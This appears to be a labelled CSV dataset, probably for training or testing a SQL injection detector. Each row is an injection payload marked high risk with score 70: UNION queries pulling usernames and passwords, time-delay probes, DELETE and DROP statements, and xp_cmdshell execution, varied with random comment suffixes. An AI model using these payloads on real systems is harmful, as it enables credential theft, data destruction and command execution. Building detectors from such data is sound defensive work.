query,risk,score
' OR 1=1; INSERT INTO logs VALUES('hack') # 8,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # e",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR SLEEP(5) AND '1'='1 # a,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; SELECT pg_sleep(5); -- # 9,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 6,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # l,high,70
'; WAITFOR DELAY '0:0:5'-- # z,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # p,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 6",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' UNION ALL SELECT username, password FROM users # 3",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 4",high,70
'; SELECT pg_sleep(5); -- # 3,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # z,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # h,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- gn5t,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- # itj1l,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- regz,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # e8bfa",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 7s11",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- qz2k,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 2c3rw,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- fvt5",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- -- v95s,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
'; DROP PROCEDURE admin_login-- -- ex7x,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- eopo,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- qcnd,high,70
'; DELETE FROM users; /**/ -- x48j,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # bo9fc,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 7c0b",high,70
'; DROP PROCEDURE admin_login-- # db0ct,high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # skiyd,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ywci",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # nir5u,high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
'; DELETE FROM users; /**/ # 8akvy,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- dx2y,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # t5xsf,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- bqh7",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- mueg,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
'; SELECT pg_sleep(5); -- -- 54yu,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 6eimw",high,70
'; DROP PROCEDURE admin_login-- # en2gn,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # c32zo",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- # w7at7,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users # dybs8",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
"' UNION ALL SELECT username, password FROM users -- xinc",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # s394v,high,70
'; WAITFOR DELAY '0:0:5'-- -- sdxm,high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- h0qw,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # b3a81,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; SELECT pg_sleep(5); -- -- nsjo,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ji1h,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
'; WAITFOR DELAY '0:0:5'-- -- 6128,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- # mpsn2,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; SELECT pg_sleep(5); -- -- w4zb,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- -- ie8d,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # f1wrq,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- iqk1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- p66m,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 3as4,high,70
'; DELETE FROM users; /**/ # uy8x7,high,70
' OR SLEEP(5) AND '1'='1 -- wl3v,high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # wu1mt",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- rzz3,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- q4uh,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
' OR SLEEP(5) AND '1'='1 # courc,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 6nol,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- -- x5gw,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # 1sszl,high,70
'; SELECT pg_sleep(5); -- # qi3hy,high,70
' OR 1=1; DROP TABLE temp; -- -- ibc6,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; SELECT pg_sleep(5); -- # crkkm,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 8pdj,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; DROP PROCEDURE admin_login-- # k1gm3,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 6t7zw,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- t5cc,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # tbnzt,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- wgus,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- # d1uyf,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
"' UNION ALL SELECT username, password FROM users -- hcvm",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- t5wi",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ -- k3i6,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # dqo5r,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 69zjs",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- otbb,high,70
'; SELECT pg_sleep(5); -- # ll765,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # cn2x1,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; WAITFOR DELAY '0:0:5'-- # wdl7l,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # a3qah",high,70
"' UNION ALL SELECT username, password FROM users -- 2dsu",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # zdy3q",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- e5c0,high,70
'; WAITFOR DELAY '0:0:5'-- # 5ubg2,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
' OR 1=1; DROP TABLE temp; -- # ugger,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; DROP PROCEDURE admin_login-- /**/ # ,high,70
'; SELECT pg_sleep(5); -- -- 6ml3,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- a1vd,high,70
'; SELECT pg_sleep(5); -- -- zhhi,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- r37h",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- kkuj",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 1seyq,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # zo7q0",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # j8dsk",high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
'; SELECT pg_sleep(5); -- -- zl86,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- # 7n4wn,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- # w861l,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; DELETE FROM users; /**/ # r3hug,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # lwsx7,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # aoatz",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 0qbe3",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- mo2o,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- tyj9",high,70
'; WAITFOR DELAY '0:0:5'-- -- vgf4,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- i4od",high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # rkk6p",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- kqr0",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # mqkb0,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- vgzx",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 0qjp",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- s8qy,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # lrx60",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
' OR 1=1; DROP TABLE temp; -- # 83cqe,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 4nrl,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 16xi,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ -- 9yku,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- vdy2,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
